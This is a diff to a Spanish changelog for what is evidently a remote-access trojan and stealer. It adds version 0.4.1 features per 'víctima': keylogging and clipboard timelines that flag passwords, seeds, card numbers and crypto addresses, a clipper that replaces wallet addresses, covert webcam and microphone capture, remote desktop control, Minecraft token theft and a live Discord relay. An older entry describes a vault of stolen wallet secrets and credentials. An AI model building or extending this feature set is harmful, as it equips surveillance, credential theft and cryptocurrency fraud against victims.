@@ -1,5 +1,16 @@
 # Changelog
 
+## 0.4.1
+
+- Timeline por víctima para `keystroke` y `clipboard`: buffer circular de 5000, persistencia, búsqueda, filtro, copiar entrada y copiar todo, con resaltado de emails, EVM, Base58, seeds, contraseñas y tarjetas (Luhn). El relay deja de perder el `kind` al publicar y el bridge de Discord emite en vivo.
+- `wallet_detected` acepta `title`/`url` y `wallet_closed` el `pid`; `WalletDetection` deduplica por proveedor+ventana, cabecera con contador y `clip_set` para sustituir la dirección.
+- Webcam `webcam:snapshot|stream|devices` con calidad, fps, selector y error real; cancelar mata ffmpeg y libera la cámara.
+- Micrófono `mic:record` en opus/webm por segmentos de 3 s, reproductor, waveform, descarga y metadatos.
+- Escritorio remoto `desktop:frame|screens` e `input:mouse|key|batch` con multimonitor, pausa y portapapeles.
+- `minecraft:token` lee launchers, valida/refresca y pinta tarjeta con skin, sin volcar el token al embed.
+- Capacidades `input`/`media` en el gate v2; las tareas nuevas exigen agente 0.4.1 y las viejas siguen operando.
+- Migración aditiva `20261111001000_timeline_wallets` y variables `TIMELINE_*`.
+
 ## 0.3.7
 
 - Bóveda cifrada por víctima y global: `WalletSecret` y `Credential` aditivos, rutas normalizadas, dedupe por hash e ingestión desde artefactos, resultados y eventos. Los valores solo salen por `reveal` autenticado y auditado (`docs/VAULT.md`).
